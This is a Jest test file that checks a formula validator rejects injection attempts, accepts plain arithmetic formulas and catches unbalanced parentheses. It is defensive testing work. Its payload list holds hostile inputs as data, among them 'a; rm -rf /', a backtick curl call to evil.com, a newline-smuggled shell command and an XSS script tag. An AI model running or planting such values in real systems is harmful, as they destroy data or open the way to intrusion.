import { validateFormulaString } from '../src/services/validator';

describe('Formula Validation & Security Tests', () => {
  test('rejects formula injection attempt (Graph 8)', () => {
    const malicious = 'a + b\n.control\nshell ls';
    const check = validateFormulaString(malicious);
    expect(check.isValid).toBe(false);
    expect(check.error).toContain('Invalid formula');
  });

  test('rejects command execution keywords and shell operators', () => {
    const payloads = [
      'a; rm -rf /',
      'a && echo hacked',
      'system("ls")',
      '`curl evil.com`',
      '<script>alert(1)</script>',
      'a + b # comment',
    ];

    for (const p of payloads) {
      const check = validateFormulaString(p);
      expect(check.isValid).toBe(false);
    }
  });

  test('accepts valid formulas (Graph 7)', () => {
    const validFormulas = [
      'a * 2 + b',
      '(a + b) / 2',
      'a * b + 10.5',
      'a - b',
      '3 * a + 4 * b',
      '(a * (b + 2))',
    ];

    for (const f of validFormulas) {
      const check = validateFormulaString(f);
      expect(check.isValid).toBe(true);
    }
  });

  test('rejects unbalanced parentheses', () => {
    expect(validateFormulaString('((a + b)').isValid).toBe(false);
    expect(validateFormulaString('(a + b))').isValid).toBe(false);
  });
});
